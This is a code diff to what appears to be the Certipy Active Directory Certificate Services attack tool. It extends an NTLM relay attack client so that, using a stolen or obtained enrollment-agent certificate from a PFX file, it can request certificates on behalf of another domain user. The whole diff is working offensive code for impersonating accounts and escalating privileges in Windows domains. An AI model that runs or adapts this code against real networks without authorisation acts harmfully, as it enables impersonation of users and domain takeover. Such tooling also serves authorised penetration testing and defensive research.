@@ -22,10 +22,14 @@ from certipy.lib.certificate import (
     cert_to_pem,
     create_csr,
     create_pfx,
+    create_on_behalf_of,
     csr_to_pem,
+    csr_to_der,
+    der_to_pem,
     get_identifications_from_certificate,
     get_object_sid_from_certificate,
     key_to_pem,
+    load_pfx,
     pem_to_cert,
     pem_to_key,
     rsa,
@@ -187,6 +191,17 @@ class ADCSAttackClient(ProtocolAttack):
         if template is None:
             template = "Machine" if self.username.endswith("$") else "User"
 
+        if self.adcs_relay.on_behalf_of:
+            self.username = self.adcs_relay.on_behalf_of
+            if self.adcs_relay.on_behalf_of.count("\\") > 0:
+                parts = self.username.split("\\")
+                username = "\\".join(parts[1:])
+                domain = parts[0]
+                if "." in domain:
+                    logging.warning(
+                        "Domain part of '-on-behalf-of' should not be a FQDN"
+                        )
+
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.dns,
@@ -194,8 +209,23 @@ class ADCSAttackClient(ProtocolAttack):
             key_size=self.adcs_relay.key_size,
         )
 
-        csr = csr_to_pem(csr).decode()
+        if self.adcs_relay.on_behalf_of:
+            if self.adcs_relay.pfx is None:
+                logging.error(
+                    "A certificate and private key (-pfx) is required in order to request on behalf of another user"
+                )
+                return False
 
+            csr = csr_to_der(csr)
+            with open(self.adcs_relay.pfx, "rb") as f:
+                agent_key, agent_cert = load_pfx(f.read())
+
+            csr = create_on_behalf_of(csr, self.adcs_relay.on_behalf_of, agent_cert, agent_key)
+            csr = der_to_pem(csr, "CERTIFICATE REQUEST")
+
+        else:
+            csr = csr_to_pem(csr).decode()
+        
         attributes = ["CertificateTemplate:%s" % template]
 
         if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
@@ -375,6 +405,8 @@ class Relay:
         upn=None,
         dns=None,
         retrieve=None,
+        on_behalf_of: str = None,
+        pfx: str = None,
         key_size: int = 2048,
         out=None,
         interface="0.0.0.0",
@@ -390,6 +422,8 @@ class Relay:
         self.upn = upn
         self.dns = dns
         self.request_id = int(retrieve)
+        self.on_behalf_of = on_behalf_of
+        self.pfx = pfx
         self.key_size = key_size
         self.out = out
         self.forever = forever
